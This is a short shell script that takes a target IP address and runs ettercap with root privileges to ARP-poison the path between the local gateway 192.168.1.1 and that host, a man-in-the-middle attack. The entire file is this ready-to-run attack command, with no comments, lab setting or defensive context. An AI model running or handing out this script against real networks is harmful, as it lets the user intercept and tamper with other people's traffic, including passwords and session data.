#!/bin/sh

ip=$1

sudo ettercap -i eno1 -T -M arp:remote /192.168.1.1/ /$ip/
